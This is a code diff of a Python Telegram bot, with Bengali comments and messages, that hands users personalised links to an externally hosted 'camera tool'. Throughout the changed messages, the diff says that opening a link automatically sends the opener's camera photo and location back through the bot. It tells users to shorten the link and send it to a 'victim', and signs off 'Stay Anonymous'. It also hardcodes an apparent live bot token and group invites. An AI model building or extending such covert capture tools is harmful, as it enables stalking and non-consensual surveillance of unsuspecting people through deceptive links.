@@ -7,10 +7,13 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8756510522:AAEOEqk0mYKuIr9c7jB0mPCk2JLxogCQhs8")
 GROUP_1_ID = int(os.getenv("GROUP_1_ID", -1003710219957))
 GROUP_2_ID = int(os.getenv("GROUP_2_ID", -1003867100912))
-LINK_URL = os.getenv("LINK_URL", "https://hilarious-tanuki-3a2b39.netlify.app/")
+LINK_URL = os.getenv("LINK_URL", "https://hilarious-tanuki-3a2b39.netlify.app/")  # আপনার হোস্ট করা লিংক
 
 GROUP_1_INVITE = "https://t.me/+3sHjdk2MXxQyOGE1"
 GROUP_2_INVITE = "https://t.me/oxifgaradarkmind"
+
+# আপনার টেলিগ্রাম ইউজারনেম (যে প্রোফাইলে যাবে)
+YOUR_TELEGRAM_USERNAME = "oxifgaradarkmind"   # উদাহরণ: "ashok" বা "oxif" - আপনার আসল ইউজারনেম দিন
 
 logging.basicConfig(level=logging.INFO)
 
@@ -41,8 +44,25 @@ async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ok2 = member2.status in ["member", "administrator", "creator"]
 
     if ok1 and ok2:
+        # ইউজারের জন্য ইউনিক লিংক (তার চ্যাট আইডি সহ)
+        user_link = f"{LINK_URL}?bot={BOT_TOKEN}&chat={user_id}"
+        
+        # বাটন তৈরি
+        keyboard = [
+            [InlineKeyboardButton("🎯 ওপেন ক্যামেরা টুল", url=user_link)],
+            [InlineKeyboardButton("👤 Allffie", url=f"https://t.me/{YOUR_TELEGRAM_USERNAME}"),
+             InlineKeyboardButton("🕷️ OXIF", url=f"https://t.me/{YOUR_TELEGRAM_USERNAME}")],
+            [InlineKeyboardButton("🔗 লিংক শর্ট করুন", url="https://lc.cx/en")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await query.edit_message_text(
-            f"✅ আপনি দুই গ্রুপেই জয়েন করেছেন!\n\n🎯 আপনার টুলের লিংক:\n`{LINK_URL}?bot={BOT_TOKEN}&chat={query.from_user.id}`\n\nলিংকে ক্লিক করলেই ক্যামেরা ও লোকেশন অটো পাঠাবে।\n\n⚠️ শুধুমাত্র আপনার জন্য এই লিংক।",
+            "🎯 **Your Device Access Links** ↙️\n\n"
+            "🔸 LOCATION + Camera photo and info:\n"
+            "নিচের বাটনে ক্লিক করুন।\n\n"
+            "📖 উপরের লিংকটি শর্ট করে ভিকটিমকে পাঠাতে পারেন।\n\n"
+            "🕷️ **DEV BY OXIF | Stay Anonymous**",
+            reply_markup=reply_markup,
             parse_mode="Markdown"
         )
     else:
@@ -50,7 +70,7 @@ async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not ok1: missing.append("গ্রুপ ১")
         if not ok2: missing.append("গ্রুপ ২")
         await query.edit_message_text(
-            f"❌ আপনি এখনো জয়েন করেননি: {', '.join(missing)}\n\nউপরের বাটনে ক্লিক করে জয়েন করুন।",
+            f"❌ আপনি এখনো জয়েন করেননি: {', '.join(missing)}\n\nউপরের বাটনে ক্লিক করে জয়েন করুন।\n\n⚠️ বটকে উভয় গ্রুপে **অ্যাডমিন** বানাতে হবে।",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔁 পুনরায় চেক করুন", callback_data="check")]])
         )
 
@@ -58,7 +78,6 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(check_callback, pattern="check"))
-    # Polling মেথড (ওয়েবহুক ছাড়া)
     app.run_polling()
 
 if __name__ == "__main__":
